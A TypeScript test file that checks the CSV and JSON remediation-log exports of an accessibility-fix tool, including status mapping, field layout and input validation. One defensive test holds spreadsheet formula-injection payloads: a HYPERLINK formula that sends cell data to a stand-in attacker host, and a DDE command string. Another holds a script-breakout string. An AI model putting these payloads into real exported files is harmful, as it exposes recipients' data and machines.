import { describe, expect, it } from 'vitest';
import {
  remediationLogCsv,
  remediationLogJson,
  ReportInputError,
  verificationResult,
  type RemediationEntry,
} from '../src/index.ts';
import { FIX_STATUSES } from '../src/vocabulary.ts';
import { remediationInput } from './fixtures.ts';

/** Splits RFC 4180 CSV into rows of unquoted fields. */
function parseCsv(csv: string): string[][] {
  expect(csv.startsWith('\uFEFF')).toBe(true);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  const body = csv.slice(1);
  for (let i = 0; i < body.length; i += 1) {
    const ch = body.charAt(i);
    if (quoted) {
      if (ch === '"' && body.charAt(i + 1) === '"') {
        field += '"';
        i += 1;
      } else if (ch === '"') {
        quoted = false;
      } else {
        field += ch;
      }
    } else if (ch === '"') {
      quoted = true;
    } else if (ch === ',') {
      row.push(field);
      field = '';
    } else if (ch === '\r' && body.charAt(i + 1) === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i += 1;
    } else {
      throw new Error(`unexpected ${JSON.stringify(ch)} outside quotes at ${String(i)}`);
    }
  }
  expect(field).toBe('');
  expect(row).toEqual([]);
  return rows;
}

describe('verificationResult', () => {
  it('maps every fix status to one verification result', () => {
    expect(Object.fromEntries(FIX_STATUSES.map((s) => [s, verificationResult(s)]))).toEqual({
      proposed: 'not_applied',
      approved: 'not_applied',
      applying: 'not_applied',
      applied: 'pending',
      verified: 'passed',
      failed: 'failed',
      reverted: 'reverted',
      rejected: 'rejected',
    });
  });
});

describe('remediationLogCsv', () => {
  it('writes one row per fix and finding, oldest fix first', () => {
    const rows = parseCsv(remediationLogCsv(remediationInput()));
    const [header, ...data] = rows;
    expect(header?.[0]).toBe('Fix ID');
    expect(header).toHaveLength(22);
    expect(data).toHaveLength(5);
    expect(data.map((r) => r[0]?.slice(-1))).toEqual(['1', '2', '2', '3', '4']);
    expect(data.map((r) => r[6])).toEqual([
      'rs-media-alt-filename',
      'button-name',
      'rs-focus-indicator-missing',
      'rs-rich-text-link-vague',
      'rs-media-alt-empty',
    ]);
  });

  it('carries the finding, criterion, approver, dates and verification result', () => {
    const [header, first] = parseCsv(remediationLogCsv(remediationInput()));
    const row = Object.fromEntries((header ?? []).map((h, i) => [h, first?.[i]]));
    expect(row).toEqual({
      'Fix ID': '01920000-0000-7000-8000-000000000001',
      'Fix type': 'Store data',
      'Delivered through': 'Shopify Admin API',
      'Written by': 'AI draft, approved by a person',
      'AI model': 'claude-haiku-5-5',
      'Fix status': 'Verified',
      Rule: 'rs-media-alt-filename',
      'Finding ID': '01920000-0000-7000-8000-0000000000f1',
      'WCAG 2.2 success criteria': '1.1.1',
      Impact: 'Serious',
      Finding: 'A product image uses a file name as its alt text.',
      'What changed': 'gid://shopify/MediaImage/1001, field alt',
      Before: 'IMG_0042.jpg',
      After: 'Blue linen shirt, front view',
      Proposed: '2026-10-01T10:00:00Z',
      'Approved by': 'Approver A',
      Approved: '2026-10-01T11:00:00Z',
      Applied: '2026-10-01T11:00:05Z',
      'Verification result': 'Passed: a later scan no longer found the barrier',
      'Verification scan': '01920000-0000-7000-8000-0000000000a1',
      Verified: '2026-10-02T03:00:00Z',
      'Undoes fix': '',
    });
  });

  it('neutralizes formulas in every merchant-controlled field', () => {
    const hostile = '=HYPERLINK("https://evil.example/?x="&A1,"Click")';
    const [entry] = remediationInput().entries;
    const finding = entry?.findings[0];
    if (entry === undefined || finding === undefined) throw new Error('fixture');
    const csv = remediationLogCsv(
      remediationInput({
        entries: [
          {
            ...entry,
            approver: { kind: 'user', name: '@SUM(1+1)*cmd|" /C calc"!A0' },
            change: {
              kind: 'data',
              resource: '+resource',
              field: '-field',
              before: hostile,
              after: '\t=1',
            },
            findings: [{ ...finding, summary: '=1+1', ruleId: '@rule' }],
          },
        ],
      }),
    );
    const [, row] = parseCsv(csv);
    for (const cell of row ?? []) {
      expect(cell, cell).not.toMatch(/^\s*[=+\-@]/u);
    }
    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?x=""&A1,""Click"")"`);
  });

  it('keeps a value shorter than a spreadsheet cell allows, marking the cut', () => {
    const [entry] = remediationInput().entries;
    if (entry === undefined) throw new Error('fixture');
    const long = 'a'.repeat(40_000);
    const csv = remediationLogCsv(
      remediationInput({
        entries: [
          {
            ...entry,
            change: { kind: 'data', resource: 'r', field: 'f', before: long, after: 'b' },
          },
        ],
      }),
    );
    const [header, row] = parseCsv(csv);
    const before = row?.[(header ?? []).indexOf('Before')] ?? '';
    expect(before.length).toBe(32_000);
    expect(before.endsWith('…')).toBe(true);
  });
});

describe('remediationLogJson', () => {
  it('writes a versioned record with raw enum values and every finding nested', () => {
    const json = JSON.parse(remediationLogJson(remediationInput())) as {
      format: string;
      version: number;
      entries: { fixId: string; verification: { result: string }; findings: unknown[] }[];
    };
    expect(json.format).toBe('rampsmith.remediation-log');
    expect(json.version).toBe(1);
    expect(json.entries.map((e) => e.verification.result)).toEqual([
      'passed',
      'pending',
      'reverted',
      'not_applied',
    ]);
    expect(json.entries[1]?.findings).toHaveLength(2);
  });

  it('escapes characters that could break out of a script or HTML context', () => {
    const [entry] = remediationInput().entries;
    if (entry === undefined) throw new Error('fixture');
    const json = remediationLogJson(
      remediationInput({
        entries: [
          {
            ...entry,
            change: {
              kind: 'data',
              resource: 'r',
              field: 'f',
              before: '</script><b>&\u2028\u2029',
              after: 'x',
            },
          },
        ],
      }),
    );
    expect(json).not.toMatch(/[<>&\u2028\u2029]/u);
    expect(JSON.parse(json)).toMatchObject({
      // U+2028 and U+2029 are line breaks, normalized to LF like CR and CRLF.
      entries: [{ change: { before: '</script><b>&\n\n' } }],
    });
  });
});

describe('remediation log inputs', () => {
  const base = (): RemediationEntry => {
    const [entry] = remediationInput().entries;
    if (entry === undefined) throw new Error('fixture');
    return entry;
  };

  it.each([
    [{ channel: 'github_pr' }, 'entries[0].channel'],
    [{ origin: 'rule' }, 'entries[0].model'],
    [{ origin: 'ai', model: undefined }, 'entries[0].model'],
    [{ approver: null }, 'entries[0].approver'],
    [{ status: 'done' }, 'entries[0].status'],
    [{ change: { kind: 'code', reference: 'x' } }, 'entries[0].change'],
    [{ findings: [] }, 'entries[0].findings'],
    [{ fixId: '' }, 'entries[0].fixId'],
    [{ verification: undefined }, 'entries[0].verification'],
    [{ proposedAt: new Date(Number.NaN) }, 'entries[0].proposedAt'],
  ])('%#: refuses %j', (override, field) => {
    const entry = { ...base(), ...override } as unknown as RemediationEntry;
    let error: unknown;
    try {
      remediationLogCsv(remediationInput({ entries: [entry] }));
    } catch (e: unknown) {
      error = e;
    }
    expect(error).toBeInstanceOf(ReportInputError);
    expect((error as ReportInputError).field).toBe(field);
  });
});
